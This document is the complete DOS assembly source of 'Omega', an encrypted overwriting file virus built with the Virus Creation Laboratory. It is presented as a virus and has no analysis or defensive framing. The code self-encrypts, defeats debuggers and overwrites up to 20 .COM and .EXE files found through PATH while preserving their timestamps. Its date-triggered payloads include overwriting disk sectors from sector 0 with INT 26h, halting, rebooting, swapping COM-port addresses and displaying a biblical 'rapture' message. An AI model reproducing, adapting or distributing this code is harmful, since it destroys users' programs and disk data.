; OMEGA.ASM -- Omega: The End      
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Noinger

virus_type	equ	1			; Overwriting Virus
is_encrypted	equ	1			; We're encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

start		label	near

main		proc	near
flag:		add	bx,0
		xchg	bx,ax

		call	encrypt_decrypt		; Decrypt the virus

start_of_code	label	near

stop_tracing:	mov	cx,09EBh
		mov	ax,0FE05h		; Acutal move, plus a HaLT
		jmp	$-2
		add	ah,03Bh			; AH now equals 025h
		jmp	$-10			; Execute the HaLT
		mov	bx,offset null_vector	; BX points to new routine
		push	cs			; Transfer CS into ES
		pop	es			; using a PUSH/POP
		int	021h
		mov	al,1			; Disable interrupt 1, too
		int	021h
		jmp	short skip_null		; Hop over the loop
null_vector:	jmp	$			; An infinite loop
skip_null:	mov	byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:	mov	al,128			; Change here screws DEBUG
		out	021h,al			; If tracing then lock keyboard

		mov	cx,0014h		; Do 20 infections
search_loop:	push	cx			; Save CX
		call	search_files		; Find and infect a file
		pop	cx			; Restore CX
		loop	search_loop		; Repeat until CX is 0

		call	get_month
		cmp	ax,0009h		; Did the function return 9?
		jle	skip00			; If less that or equal, skip effect
		call	get_day
		cmp	ax,0010h		; Did the function return 16?
		jle	skip00			; If less that or equal, skip effect
		call	get_hour
		cmp	ax,0009h		; Did the function return 9?
		jle	skip00			; If less that or equal, skip effect
		cmp	ax,000Fh		; Did the function return 15?
		jge	skip00			; If greater than or equal, skip effect
		jmp	short strt00		; Success -- skip jump
skip00:		jmp	end00			; Skip the routine
strt00:		mov	cx,423Fh		; First argument is 16959
new_shot:       push	cx			; Save the current count
		mov 	dx,0140h		; DX holds pitch
		mov   	bx,0100h		; BX holds shot duration
		in    	al,061h			; Read the speaker port
		and   	al,11111100b		; Turn off the speaker bit
fire_shot:	xor	al,2                    ; Toggle the speaker bit
		out	061h,al			; Write AL to speaker port
		add     dx,09248h		;
		mov	cl,3                    ;
		ror	dx,cl			; Figure out the delay time
		mov	cx,dx                   ;
		and	cx,01FFh                ;
		or	cx,10                   ;
shoot_pause:	loop	shoot_pause             ; Delay a bit
		dec	bx			; Are we done with the shot?
		jnz	fire_shot		; If not, pulse the speaker
		and   	al,11111100b		; Turn off the speaker bit
		out   	061h,al			; Write AL to speaker port
		mov   	bx,0002h                ; BX holds delay time (ticks)
		xor   	ah,ah			; Get time function
		int   	1Ah			; BIOS timer interrupt
		add   	bx,dx                   ; Add current time to delay
shoot_delay:    int   	1Ah			; Get the time again
		cmp   	dx,bx			; Are we done yet?
		jne   	shoot_delay		; If not, keep checking
		pop	cx			; Restore the count
		loop	new_shot		; Do another shot

		mov	si,0001h		; First argument is 1
		push	es			; Save ES
		xor	ax,ax			; Set the extra segment to
		mov	es,ax                   ; zero (ROM BIOS)
		shl	si,1			; Convert to word index
		mov	word ptr [si + 03FEh],0	; Zero COM port address
		pop	es			; Restore ES

end00:		call	get_month
		cmp	ax,0009h		; Did the function return 9?
		jne	skip01			; If not equal, skip effect
		call	get_day
		cmp	ax,0004h		; Did the function return 4?
		jle	skip01			; If less that or equal, skip effect
		jmp	short strt01		; Success -- skip jump
skip01:		jmp	end01			; Skip the routine
strt01:		db      0EAh,000h,000h,0FFh,0FFh  ; jmp far FFFFh:0000h

end01:		call	get_month
		cmp	ax,0001h		; Did the function return 1?
		jne	skip02			; If not equal, skip effect
		call	get_day
		cmp	ax,0001h		; Did the function return 1?
		jle	skip02			; If less that or equal, skip effect
		call	get_hour
		cmp	ax,000Fh		; Did the function return 15?
		jge	skip02			; If greater than or equal, skip effect
		jmp	short strt02		; Success -- skip jump
skip02:		jmp	end02			; Skip the routine
strt02:		mov	bx,0001h		; First argument is 1
		mov	si,0002h		; Second argument is 2
		push	es			; Save ES
		xor	ax,ax			; Set the extra segment to
		mov	es,ax                   ; zero (ROM BIOS)
		shl	bx,1			; Convert to word index
		shl	si,1			; Convert to word index
		mov	ax,word ptr [bx + 03FEh]; Zero COM port address
		xchg	word ptr [si + 03FEh],ax; Put first value in second,
		mov	word ptr [bx + 03FEh],ax; and second value in first!
		pop	es			; Restore ES

end02:		call	get_month
		cmp	ax,000Bh		; Did the function return 11?
		jne	skip03			; If not equal, skip effect
		call	get_day
		cmp	ax,0004h		; Did the function return 4?
		jle	skip03			; If less that or equal, skip effect
		call	get_hour
		cmp	ax,000Fh		; Did the function return 15?
		jge	skip03			; If greater than or equal, skip effect
		jmp	short strt03		; Success -- skip jump
skip03:		jmp	end03			; Skip the routine
strt03:		int	018h			; Drop to ROM BASIC

end03:		call	get_month
		cmp	ax,000Ch		; Did the function return 12?
		jne	skip04			; If not equal, skip effect
		call	get_day
		cmp	ax,0002h		; Did the function return 2?
		jle	skip04			; If less that or equal, skip effect
		cmp	ax,0002h		; Did the function return 2?
		jge	skip04			; If greater than or equal, skip effect
		jmp	short strt04		; Success -- skip jump
skip04:		jmp	end04			; Skip the routine
strt04:		cli				; Clear the interrupt flag
		hlt				; HaLT the computer
		jmp	short $			; Just to make sure

end04:		call	get_year
		cmp	ax,07CDh		; Did the function return 1997?
		jle	skip05			; If less that or equal, skip effect
		call	get_month
		cmp	ax,0001h		; Did the function return 1?
		jne	skip05			; If not equal, skip effect
		call	get_hour
		cmp	ax,0005h		; Did the function return 5?
		jle	skip05			; If less that or equal, skip effect
		cmp	ax,000Fh		; Did the function return 15?
		jge	skip05			; If greater than or equal, skip effect
		call	get_second
		cmp	ax,0001h		; Did the function return 1?
		jne	skip05			; If not equal, skip effect
		jmp	short strt05		; Success -- skip jump
skip05:		jmp	end05			; Skip the routine
strt05:		mov	si,offset data00	; SI points to data
		mov	ah,0Eh			; BIOS display char. function
display_loop:   lodsb				; Load the next char. into AL
		or	al,al			; Is the character a null?
		je	disp_strnend		; If it is, exit
		int	010h			; BIOS video interrupt
		jmp	short display_loop	; Do the next character
disp_strnend:

end05:		call	get_year
		cmp	ax,07CDh		; Did the function return 1997?
		jle	skip06			; If less that or equal, skip effect
		call	get_month
		cmp	ax,0001h		; Did the function return 1?
		jle	skip06			; If less that or equal, skip effect
		call	get_hour
		cmp	ax,0009h		; Did the function return 9?
		jle	skip06			; If less that or equal, skip effect
		cmp	ax,000Fh		; Did the function return 15?
		jge	skip06			; If greater than or equal, skip effect
		call	get_second
		cmp	ax,0005h		; Did the function return 5?
		jne	skip06			; If not equal, skip effect
		jmp	short strt06		; Success -- skip jump
skip06:		jmp	end06			; Skip the routine
strt06:		mov	ax,0002h		; First argument is 2
		mov	cx,423Fh		; Second argument is 16959
		cli				; Disable interrupts (no Ctrl-C)
		cwd				; Clear DX (start with sector 0)
		int	026h			; DOS absolute write interrupt
		sti				; Restore interrupts

end06:		mov	ax,04C00h		; DOS terminate function
		int	021h
main		endp


		db	0FDh,0C8h,006h,0C6h,0DFh

search_files	proc	near
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,135			; Allocate 135 bytes on stack

		mov	byte ptr [bp - 135],'\'	; Start with a backslash

		mov	ah,047h			; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 134]		; SI points to 64-byte buffer
		int	021h

		call	traverse_path		; Start the traversal

traversal_loop:	cmp	word ptr [path_ad],0	; Was the search unsuccessful?
		je	done_searching		; If so then we're done
		call	found_subdir		; Otherwise copy the subdirectory

		mov	ax,cs			; AX holds the code segment
		mov	ds,ax			; Set the data and extra
		mov	es,ax			; segments to the code segment

		xor	al,al			; Zero AL
		stosb				; NULL-terminate the directory

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 70]		; DX points to the directory
		int	021h

		mov	dx,offset com_mask	; DX points to "*.COM"
		call	find_files		; Try to infect a .COM file
		jnc	done_searching		; If successful the exit
		mov	dx,offset exe_mask	; DX points to "*.EXE"
		call	find_files		; Try to infect an .EXE file
		jnc	done_searching		; If successful the exit
		jmp	short traversal_loop	; Keep checking the PATH

done_searching:	mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 135]		; DX points to old directory
		int	021h

		cmp	word ptr [path_ad],0	; Did we run out of directories?
		jne	at_least_tried		; If not then exit
		stc				; Set the carry flag for failure
at_least_tried:	mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller
com_mask	db	"*.COM",0		; Mask for all .COM files
exe_mask	db	"*.EXE",0		; Mask for all .EXE files
search_files	endp

traverse_path	proc	near
		mov	es,word ptr cs:[002Ch]	; ES holds the enviroment segment
		xor	di,di			; DI holds the starting offset

find_path:	mov	si,offset path_string	; SI points to "PATH="
		lodsb				; Load the "P" into AL
		mov	cx,08000h		; Check the first 32767 bytes
	repne	scasb				; Search until the byte is found
		mov	cx,4			; Check the next four bytes
check_next_4:	lodsb				; Load the next letter of "PATH="
		scasb				; Compare it to the environment
		jne	find_path		; If there not equal try again
		loop	check_next_4		; Otherwise keep checking

		mov	word ptr [path_ad],di	; Save the PATH address for later
		mov	word ptr [path_ad + 2],es  ; Save PATH's segment for later
		ret				; Return to caller

path_string	db	"PATH="			; The PATH string to search for
path_ad		dd	?			; Holds the PATH's address
traverse_path	endp

found_subdir	proc	near
		lds	si,dword ptr [path_ad]	; DS:SI points to the PATH
		lea	di,[bp - 70]		; DI points to the work buffer
		push	cs			; Transfer CS into ES for
		pop	es			; byte transfer
move_subdir:	lodsb				; Load the next byte into AL
		cmp	al,';'			; Have we reached a separator?
		je	moved_one		; If so we're done copying
		or	al,al			; Are we finished with the PATH?
		je	moved_last_one		; If so get out of here
		stosb				; Store the byte at ES:DI
		jmp	short move_subdir	; Keep transfering characters

moved_last_one:	xor	si,si			; Zero SI to signal completion
moved_one:	mov	word ptr es:[path_ad],si; Store SI in the path address
		ret				; Return to caller
found_subdir	endp

		db	0BFh,0C0h,0BDh,072h,05Fh


find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh			; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

		db	0A9h,06Bh,0DAh,081h,0AFh

infect_file	proc	near
		mov	ah,02Fh			; DOS get DTA address function
		int	021h
		mov	si,bx			; SI points to the DTA

		mov	byte ptr [set_carry],0	; Assume we'll fail

		cmp	word ptr [si + 01Ch],0	; Is the file > 65535 bytes?
		jne	infection_done		; If it is then exit

		cmp	word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
		je	infection_done		; If it is then skip it

		cmp	word ptr [si + 01Ah],(finish - start)
		jb	infection_done		; If it's too small then exit

		mov	ax,03D00h		; DOS open file function, r/o
		lea	dx,[si + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,03Fh			; DOS read from file function
		mov	cx,4			; CX holds bytes to read (4)
		mov	dx,offset buffer	; DX points to buffer
		int	021h

		mov	ah,03Eh			; DOS close file function
		int	021h

		push	si			; Save DTA address before compare
		mov	si,offset buffer	; SI points to comparison buffer
		mov	di,offset flag		; DI points to virus flag
		mov	cx,4			; CX holds number of bytes (4)
	rep	cmpsb				; Compare the first four bytes
		pop	si			; Restore DTA address
		je	infection_done		; If equal then exit
		mov	byte ptr [set_carry],1	; Success -- the file is OK

		mov	ax,04301h		; DOS set file attrib. function
		xor	cx,cx			; Clear all attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

		mov	ax,03D02h		; DOS open file function, r/w
		int	021h
		xchg	bx,ax			; BX holds file handle

		push	si			; Save SI through call
		call	encrypt_code		; Write an encrypted copy
		pop	si			; Restore SI

		mov	ax,05701h		; DOS set file time function
		mov	cx,[si + 016h]		; CX holds old file time
		mov	dx,[si + 018h]		; DX holds old file date
		int	021h

		mov	ah,03Eh			; DOS close file function
		int	021h

		mov	ax,04301h		; DOS set file attrib. function
		xor	ch,ch			; Clear CH for file attribute
		mov	cl,[si + 015h]		; CX holds file's old attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

infection_done:	cmp	byte ptr [set_carry],1	; Set carry flag if failed
		ret				; Return to caller

buffer		db	4 dup (?)		; Buffer to hold test data
set_carry	db	?			; Set-carry-on-exit flag
infect_file	endp


		db	0F1h,0F6h,003h,06Bh,099h

get_day         proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		mov	al,dl			; Copy day into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_day         endp

		db	0CDh,005h,004h,026h,0CFh

get_hour        proc	near
		mov	ah,02Ch			; DOS get time function
		int	021h
		mov	al,ch			; Copy hour into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_hour        endp

		db	0F3h,06Ah,0F8h,002h,08Ah

get_month       proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		mov	al,dh			; Copy month into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_month       endp

		db	0A8h,000h,015h,081h,0E7h

get_second      proc	near
		mov	ah,02Ch			; DOS get time function
		int	021h
		mov	al,dh			; Copy second into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_second      endp

		db	03Fh,0FFh,089h,057h,0F2h

get_year        proc	near
		mov	ah,02Ah			; DOS get date function
		int	021h
		xchg	cx,ax			; Transfer the year into AX
		ret				; Return to caller
get_year        endp

data00:
db          "Says the OMEGA virus:"
		
db                        "It has been nice playing these games with you but now it is all over."
db                "[...I am the Alpha and the Omega, the begining and the end.]"
db                                                                "-Rev 22:6"
db                "Your C drive is being raptured!"
		
db                                        "[...It is finished...]"
db                                                "-Rev 16:17"
		
         
db                                                "____________"
db                                               "/            \"
db                                              "|              |"
db                                              "|              |" 
db                                              "|              |"
db                                        "\      \            /      /"
db                                          "\______\        /______/"
		
db                                                 "Omega"
db                                                      "(The End)"

vcl_marker	db	"[VCL]",0		; VCL creation marker

encrypt_code	proc	near
		mov	si,offset encrypt_decrypt; SI points to cipher routine

		xor	ah,ah			; BIOS get time function
		int	01Ah
		mov	word ptr [si + 8],dx	; Low word of timer is new key

		xor	byte ptr [si],1		;
		xor	byte ptr [si + 7],1	; Change all SIs to DIs
		xor	word ptr [si + 10],0101h; (and vice-versa)

		mov	di,offset finish	; Copy routine into heap
		mov	cx,finish - encrypt_decrypt - 1  ; All but final RET
		push	si			; Save SI for later
		push	cx			; Save CX for later
	rep	movsb				; Copy the bytes

		mov	si,offset write_stuff	; SI points to write stuff
		mov	cx,5			; CX holds length of write
	rep	movsb				; Copy the bytes

		pop	cx			; Restore CX
		pop	si			; Restore SI
		inc	cx			; Copy the RET also this time
	rep	movsb				; Copy the routine again

		mov	ah,040h			; DOS write to file function
		mov	dx,offset start		; DX points to virus

		call	finish			; Encrypt/write/decrypt

		ret				; Return to caller

write_stuff:	mov	cx,finish - start	; Length of code
		int	021h
encrypt_code	endp

end_of_code	label	near

encrypt_decrypt	proc	near
		mov	si,offset start_of_code ; SI points to code to decrypt
		mov	cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:	db	081h,034h,00h,00h	; XOR a word by the key
		inc	si			; Do the next word
		inc	si			;
		loop	xor_loop		; Loop until we're through
		ret				; Return to caller
encrypt_decrypt	endp
finish		label	near

code		ends
		end	main
